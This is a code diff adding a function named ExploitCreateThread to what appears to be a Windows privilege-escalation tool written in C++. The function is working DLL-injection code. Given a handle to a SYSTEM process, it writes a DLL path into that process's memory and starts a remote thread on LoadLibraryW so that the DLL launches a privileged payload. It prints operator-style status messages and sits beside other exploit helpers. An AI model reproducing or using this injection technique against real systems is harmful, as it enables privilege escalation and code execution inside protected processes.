@@ -139,6 +139,66 @@ DWORD ExploitDupHandle(HANDLE hProc, LPWSTR commandLine) {
 	return 0;
 }
 
+// ExploitCreateThread: given a SYSTEM process handle with PROCESS_CREATE_THREAD
+// (and implicitly PROCESS_VM_OPERATION + PROCESS_VM_WRITE for VirtualAllocEx /
+// WriteProcessMemory), injects dllPath into the target via LoadLibraryW.
+// The DLL's DllMain is responsible for spawning the privileged payload.
+// LoadLibraryW is resolved locally — per-boot ASLR keeps kernel32 at the same
+// base address in every process within a Windows session.
+DWORD ExploitCreateThread(HANDLE hProc, LPWSTR dllPath) {
+	LPVOID loadLibW = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32"), "LoadLibraryW");
+	if (!loadLibW) {
+		std::cerr << "[-] Failed to resolve LoadLibraryW\n";
+		return 0;
+	}
+
+	SIZE_T pathBytes = (wcslen(dllPath) + 1) * sizeof(WCHAR);
+
+	// Allocate a readable page in the target for the DLL path string
+	LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, pathBytes,
+		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (!remoteBuf) {
+		std::cerr << "[-] VirtualAllocEx failed (need PROCESS_VM_OPERATION): "
+			<< std::dec << GetLastError() << "\n";
+		return 0;
+	}
+
+	if (!WriteProcessMemory(hProc, remoteBuf, dllPath, pathBytes, NULL)) {
+		std::cerr << "[-] WriteProcessMemory failed: " << std::dec << GetLastError() << "\n";
+		VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+		return 0;
+	}
+
+	std::cout << "[+] DLL path written to target at 0x" << std::hex << (uintptr_t)remoteBuf
+		<< ", creating remote thread -> LoadLibraryW...\n";
+
+	DWORD tid = 0;
+	HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0,
+		(LPTHREAD_START_ROUTINE)loadLibW, remoteBuf, 0, &tid);
+	if (!hRemote) {
+		std::cerr << "[-] CreateRemoteThread failed: " << std::dec << GetLastError() << "\n";
+		VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+		return 0;
+	}
+
+	std::cout << "[+] Remote thread TID " << std::dec << tid << ", waiting for DLL load...\n";
+	WaitForSingleObject(hRemote, 5000);
+
+	DWORD exitCode = 0;
+	GetExitCodeThread(hRemote, &exitCode);
+	CloseHandle(hRemote);
+	VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
+
+	if (exitCode == 0) {
+		std::cerr << "[-] LoadLibraryW returned NULL — DLL load failed or path invalid\n";
+		return 0;
+	}
+
+	// exitCode is the HMODULE of the loaded DLL — non-zero means success
+	std::cout << "[+] DLL loaded (HMODULE: 0x" << std::hex << exitCode << ")\n";
+	return tid;
+}
+
 // NtImpersonateThread: undocumented API — impersonates the security context of
 // ThreadToImpersonate on ThreadHandle. Requires THREAD_DIRECT_IMPERSONATION on
 // the target thread.
